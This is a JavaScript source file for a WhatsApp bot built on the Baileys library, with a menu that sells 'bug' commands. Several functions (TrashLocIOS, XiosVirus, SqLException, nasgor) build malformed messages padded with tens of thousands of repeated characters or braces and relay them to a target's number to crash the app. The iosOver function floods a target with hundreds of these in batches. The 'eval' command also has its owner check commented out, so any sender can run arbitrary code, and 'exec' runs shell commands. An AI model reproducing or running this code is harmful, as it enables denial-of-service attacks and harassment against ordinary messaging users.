const config = require('./settings/config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch")
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');
const speed = require('performance-now')
const { spawn, exec, execSync } = require('child_process');
const { default: baileys, getContentType, generateWAMessageFromContent, proto } = require("baileys");
module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
        );
        
        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" ||
              client.user.id : m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const botNumber = await client.decodeJid(client.user.id);
        const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, './satanic/lib/database/owner.json'), 'utf8'))
        const isOwner = [botNumber, ...kontributor].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
        const isBot = botNumber.includes(senderNumber)
        
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        
        const { smsg, fetchJson, sleep, formatSize, runtime } = require('./satanic/lib/myfunction');     
        const cihuy = fs.readFileSync('./satanic/lib/media/w-shennmine.jpg')
        const { fquoted } = require('./satanic/lib/fquoted')

        // group
        const groupMetadata = m?.isGroup ? await client.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                admin,
                full: p
            };
        }) || []: [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
        const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
        const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
        async function getLid(jid) {
            return client.getLidUser(jid)
        }
        
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   ▢ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ▢ Pesan: ${m.body || m.mtype} \n` +
                    `   ▢ Pengirim: ${pushname} \n` +
                    `   ▢ JID: ${senderNumber} \n`
                )
            );
            console.log();
        }
        
       
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: "arraybuffer" })
    return Buffer.from(res.data, "binary")
}

        const reaction = async (jidss, emoji) => {
            client.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
        async function reply(text) {
            client.sendMessage(m.chat, {
                text: "\n" + text + "\n",
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: config.settings.title,
                        body: config.settings.description,
                        thumbnailUrl: config.thumbUrl,
                        sourceUrl: config.socialMedia.Telegram,
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: fquoted.packSticker })
        }
     
        async function TrashLocIOS(XS) {
            try {
                const locationMessage = {
        			degreesLatitude: -9.09999262999,
        			degreesLongitude: 199.99963118999,
        			jpegThumbnail: null,
        			name: "🩸⃟⃨〫⃰‣ ⁖𝐗͢𝐒 𝐌͢Θ𝐃𝐃͢Σ𝐑𝐒 ‣—" + "𖣂".repeat(15000),
        			address: " 🍧⃟༑⌁⃰𝐃𝐞ͯ𝐬𝐭𝐫͢𝐮𝐢𝐝𝐨𝐫 𝐗͜𝐒ཀ͜͡🍨" + "𖣂".repeat(5000),
        			url: `https://www.xnxx.${"𖣂".repeat(25000)}.com`,
        		}
        		
        		const msg = generateWAMessageFromContent(XS, {
                    viewOnceMessage: {
                        message: { locationMessage }
                    }
                }, {});
        		
        		await client.relayMessage('status@broadcast', msg.message, {
        			messageId: msg.key.id,
        			statusJidList: [XS],
        			additionalNodes: [{
        				tag: 'meta',
        				attrs: {},
        				content: [{
        					tag: 'mentioned_users',
        					attrs: {},
        					content: [{
        						tag: 'to',
        						attrs: { jid: XS },
        						content: undefined
        					}]
        				}]
        			}]
        		});
        	} catch (err) {
        		console.error(err);
        	}
        };

async function XiosVirus(client, X) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "𝗫𝗦 𝗠𝗢𝗗𝗗𝗘𝗥𝗦" + "𖣂".repeat(15000),
         address: "🩸⃟༑⌁⃰𝐓𝐡͢𝐚𝐧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🦠" + "𖣂".repeat(5000),
         url: `https://api-than-xs.${"𖣂".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "JustinXSatanic",
            matchedText: "https://t.me/thanror",
            description: "ios turbo - 1080".repeat(15000),
            title: "—!s thann xs".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await client.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await client.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

const crypto  = require("crypto")
async function SqLException(client, isTarget) {
  const payload = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        jpegThumbnail: cihuy
      },
      contextInfo: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        conversionSource: "porn",
        conversionData: crypto.randomBytes(16),
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        quotedAd: {
          advertiserName: "StX Revolution 👾",
          mediaType: "IMAGE",
          jpegThumbnail: cihuy,
          caption: "SOLO EXPOSED"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
        expiration: -99999,
        ephemeralSettingTimestamp: Date.now(),
        ephemeralSharedSecret: crypto.randomBytes(16),
        entryPointConversionSource: "WhatsaApp",
        entryPointConversionApp: "WhatsApp",
        actionLink: {
          url: "t.me/tamainfinity",
          buttonTitle: "action_button"
        },
        disappearingMode: {
          initiator: 1,
          trigger: 2,
          initiatorDeviceJid: isTarget,
          initiatedByMe: true
        },
        groupSubject: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        parentGroupJid: "120363370626418572@g.us",
        trustBannerType: "X",
        trustBannerAction: 99999,
        isSampled: true,
        externalAdReply: {
          title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
          mediaType: 2,
          renderLargerThumbnail: false,
          showAdAttribution: false,
          containsAutoReply: false,
          body: "© T-Яyuichi",
          thumbnail: cihuy,
          sourceUrl: "t.me/tamainfinity",
          sourceId: "9T7A4M1A",
          ctwaClid: "ctwaClid",
          ref: "ref",
          clickToWhatsappCall: true,
          ctaPayload: "ctaPayload",
          disableNudge: true,
          originalImageUrl: null
        },
        featureEligibilities: {
          cannotBeReactedTo: true,
          cannotBeRanked: true,
          canRequestFeedback: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
          contentType: 3,
          accessibilityText: "FnX Exposed"
        },
        statusAttributionType: 2,
        utm: {
          utmSource: "XSource",
          utmCampaign: "XCampaign"
        }
      },
      body: {
        text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: `{}`
          }
        ]
      }
    }
  };

  const message = await (async () => {
    try {
      return generateWAMessageFromContent(
        isTarget,
        payload,
        {}
      );
    } catch (e) {
      console.error("Error generating message payload:", e);
    }
  })();

  if (message) {
    await client.relayMessage(
      isTarget,
      message.message,
      {
        messageId: message.key.id,
        participant: {
          jid: isTarget
        }
      }
    );
  }
}
        
async function nasgor(target) {
  await client.relayMessage(target, {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true, 
        jpegThumbnail: cihuy, 
        title: "D | 7eppeli-Exploration"
      }, 
      contextInfo: {
        participant: "13135550002@s.whatsapp.net", 
        remoteJid: "status@broadcast", 
        conversionSource: "Wa.me/stickerpack/d7y", 
        conversionData: Math.random(), 
        conversionDelaySeconds: 250208,
        isForwarded: true, 
        forwardingScore: 250208,
        forwardNewsletterMessageInfo: {
          newsletterName: "D | 7eppeli-Exploration", 
          newsletterJid: "1@newsletter", 
          serverMessageId: 1
        }, 
        quotedAd: {
          caption: "D | 7eppeli-Exploration", 
          advertiserName: "D | 7eppeli-Exploration", 
          mediaType: "VIDEO" 
        }, 
        placeKeyHolder: {
          fromMe: false, 
          remoteJid: "0@s.whatsapp.net", 
          id: "YUKJAL1234"
        }, 
        expiration: -250208, 
        ephemeralSettingTimestamp: 99999,
        ephemeralSharedSecret: 999,
        entryPointConversionSource: "Whatsapp.com", 
        entryPointConversionApp: "Whatsapp.com", 
        actionLink: {
          url: "Wa.me/stickerpack/d7y", 
          buttonTitle: "D | 7eppeli-Exploration"
        }
      }, 
      nativeFlowMessage: {
        messageParamaJson: "{".repeat(9000), 
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":false}"
          }
        ], 
        messageParamsJson: "}".repeat(9000)
      }
    }
  }, { participant: { jid:target } }) 
}
        async function iosOver(durationHours, XS) {
            const totalDurationMs = durationHours * 60 * 60 * 1000;
            const startTime = Date.now();
            let count = 0;
            let batch = 1;
            const maxBatches = 5;
            
            const sendNext = async () => {
                if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
                    console.log(`Success! Total terkirim: ${batch - 1}`);
                    return;
                }
                
                try {
                    if (count < 200) {
                        await Promise.all([
                            XiosVirus(XS),
                            TrashLocIOS(XS)
                        ]);
                        console.log(chalk.yellow(`${count + 1}/200 🍷`));
                        count++;
                        setTimeout(sendNext, 100);
                    } else {
                        console.log(chalk.green(`Success Send Bug to ${XS} (${batch})`));
                        if (batch < maxBatches) {
                            console.log(chalk.yellow(`JustinXSatanic — 2025`));
                            count = 0;
                            batch++;
                            setTimeout(sendNext, 5 * 60 * 1000);
                        } else {
                            console.log(chalk.blue(`${maxBatches}`));
                        }
                    }
                } catch (error) {
                    console.error(`❌ Error saat mengirim: ${error.message}`);
                    setTimeout(sendNext, 700);
                }
            };
            sendNext();
        }
        
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./command"));
        const plug = {
            client,
            prefix,
            command, 
            reply, 
            text, 
            isBot,
            reaction,
            pushname, 
            mime,
            quoted,
            sleep,
            fquoted,
            fetchJson 
        };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.isBot && !isBot) {
                    return
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return m.reply(config.message.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        if (!pluginsDisable) return;  

        switch (command) {
          case "menu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `
*- 計さ INFORMATION BOT*
 ⌬ Botname : Justin Official 
 ⌬ BuyScript : t.me/justinoffc
 ⌬ Version : 21.0.0
 ⌬ Speed : ${latensi.toFixed(4)} s
 ⌬ RAM : ${formattedUsedMem} / ${formattedTotalMem}

*- 計さ COMMAND BUGS*
 ▢ ${prefix}iosinvis
 ▢ ${prefix}crashandro
 ▢ ${prefix}forceandro

*- 計さ COMMAND MAIN*
 ▢ ${prefix}tagall
 ▢ ${prefix}get
 ▢ ${prefix}insp
 ▢ ${prefix}csesi
 ▢ ${prefix}exec
 ▢ ${prefix}eval
 ▢ ${prefix}mesinfo

*- 計さ COMMAND OWNER*
 ▢ ${prefix}addowner
 ▢ ${prefix}delowner`
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/9id6oh.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "JustinOfficialV21",
                        url: "t.me/justinandiar",
                        copy_code: "VIP Version Justin",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "JustinXSatanic",
                        button_title: "Justin Version 21"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/justinoffc",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "satanic",
                            sections: [
                                {
                                    title: "# X - the best",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "@justinsatanic", 
                                            description: "b!cth",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "@buggs",
                                            description: "satanic",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "justin",
                            id: "123456789",
                            copy_code: "https://t.me/justinoffc"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "credit",
                            id: `${prefix}tqto`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "buy script",
                            id: `${prefix}buysc`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.packSticker });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: fs.readFileSync('./satanic/sound.mp3'),
        mimetype: 'audio/mp4',
        ptt: true
    }, { quoted: m })
}
break
            case "mesinfo": {
                if (!m.quoted) return reply("harap reply ke sebuah pesan untuk mengecek mtype dan id-nya.");
             
                const type = m.quoted.mtype;
                const id = m.quoted.id;
                reply(`Pesan yang di-reply memiliki:\n- Tipe pesan: *${type}*\n- ID pesan: *${id}*`);
            }
            break;
            case "get":{
                if (!isOwner) return reply(config.message.owner)
             //   if (!isBot) return
                if (!/^https?:\/\//.test(text)) return reply(`*ex:* ${prefix + command} https://kyuurzy.site`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⚡")
                
                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return client.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: fquoted.packSticker });
                }
        
                if (contentType.startsWith("video/")) {
                    return client.sendMessage(m.chat, {
                        video: { url: text } 
                    }, { quoted: fquoted.packSticker });
                }
                
                if (contentType.startsWith("audio/")) {
                    return client.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg', 
                        ptt: true
                    }, { quoted: fquoted.packSticker });
                }
        
                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break
            case "insp": {
                if (!isOwner) return reply(config.message.owner)
          //      if (!isBot) return
                if (!text && !m.quoted) return reply(`*reply:* ${prefix + command}`);
                let quotedType = m.quoted?.mtype || '';
                let penis = JSON.stringify({ [quotedType]: m.quoted }, null, 2);
                const acak = `insp-${crypto.randomBytes(6).toString('hex')}.json`;
                
                await client.sendMessage(m.chat, {
                    document: Buffer.from(penis),
                    fileName: acak,
                    mimetype: "application/json"
                }, { quoted: fquoted.packSticker })
            }
            break
            case 'tagall':{
                if (!isOwner) return reply(config.message.owner)
         //       if (!isBot) return
                const textMessage = args.join(" ") || "nothing";
                let teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await client.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                client.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: fquoted.packSticker });
            }
            break
            case "exec": {
                if (!isOwner) return reply(config.message.owner)
            //    if (!isBot) return;
                if (!budy.startsWith(".exec")) return;
                
                const { exec } = require("child_process");
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} ls`);
                exec(args, (err, stdout) => {
                    if (err) return reply(String(err));
                    if (stdout) return reply(stdout);
                });
            }
            break;
            case "eval": {
            //    if (!isOwner) return reply(config.message.owner)
            //    if (!isBot) return;
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await reply(require('util').format(teks));
                }
            }
            break;
                
            // owner
            case 'addowner': {
                if (!isOwner) return reply(config.message.owner)
                if (!q) return reply(`— ex: ${prefix + command} 62`);
                
                let bijipler = q.replace(/[^0-9]/g, "")
                if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                let add = bijipler + '@s.whatsapp.net'
                
                let capt = `anda kini telah mendapatkan akses owner ke bot`
                kontributor.push(bijipler)
                fs.writeFileSync(path.resolve(__dirname, './satanic/lib/database/owner.json'), JSON.stringify(kontributor), 'utf8')
                reply("berhasil menambahkan ke daftar owner")
